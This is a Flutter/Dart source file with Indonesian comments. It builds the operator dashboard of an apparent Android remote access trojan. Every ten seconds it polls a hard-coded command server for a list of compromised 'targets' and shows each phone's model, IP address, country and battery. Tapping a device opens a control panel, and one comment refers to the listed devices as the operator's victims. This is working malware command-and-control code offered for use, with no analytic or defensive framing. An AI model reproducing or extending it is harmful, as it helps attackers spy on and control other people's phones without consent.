import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'package:shared_preferences/shared_preferences.dart'; // Tambahkan import ini

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  String _adminEmail = ""; // Variabel untuk menampung email dari session

  @override
  void initState() {
    super.initState();
    _initSession(); // Ambil email dari SharedPreferences saat start
  }

  // Fungsi untuk mengambil email yang disimpan saat login
  Future<void> _initSession() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      // Ambil kunci yang sama dengan yang ada di login_rat_page.dart
      _adminEmail = prefs.getString('rat_session_email') ?? "";
    });
    
    if (_adminEmail.isNotEmpty) {
      _fetchDevices();
      // Auto refresh setiap 10 detik
      _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    if (_adminEmail.isEmpty) return; // Jangan fetch kalau email belum siap

    try {
      // Sekarang mengirim email secara dinamis ke server
      final response = await http.get(
        Uri.parse("http://fourzhost.privateserverr.web.id:3158/api/list-targets?email=$_adminEmail"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      print("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F111E),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        // Menampilkan email yang sedang aktif agar jelas milik siapa korbannya
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text("RAT LIST", style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold)),
            Text(_adminEmail, style: const TextStyle(fontSize: 10, color: Colors.white38)),
          ],
        ),
        actions: [
          if (_isLoading) 
            const Padding(padding: EdgeInsets.all(15), child: SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2)))
          else
            IconButton(onPressed: _fetchDevices, icon: const Icon(Icons.refresh))
        ],
      ),
      body: _devices.isEmpty 
        ? const Center(child: Text("BELUM ADA TARGET TERDAFTAR", style: TextStyle(color: Colors.white24)))
        : ListView.builder(
            padding: const EdgeInsets.all(15),
            itemCount: _devices.length,
            itemBuilder: (context, index) {
              final device = _devices[index];
              return GestureDetector(
                onTap: () => Navigator.pushNamed(context, '/control_panel', arguments: device),
                child: Container(
                  margin: const EdgeInsets.only(bottom: 15),
                  padding: const EdgeInsets.all(18),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1D2D),
                    borderRadius: BorderRadius.circular(25),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: Row(
                    children: [
                      const Icon(Icons.phone_android, color: Colors.white70, size: 35),
                      const SizedBox(width: 15),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              device['model'] ?? "Unknown Device",
                              style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                            ),
                            Text(
                              "IP: ${device['ip'] ?? '0.0.0.0'} (${device['country'] ?? 'ID'})",
                              style: const TextStyle(color: Colors.white38, fontSize: 11),
                            ),
                          ],
                        ),
                      ),
                      Text(
                        "${device['battery'] ?? '0'}%",
                        style: const TextStyle(color: Color(0xFFD4FF00), fontWeight: FontWeight.bold, fontSize: 18),
                      ),
                    ],
                  ),
                ),
              );
            },
          ),
    );
  }
}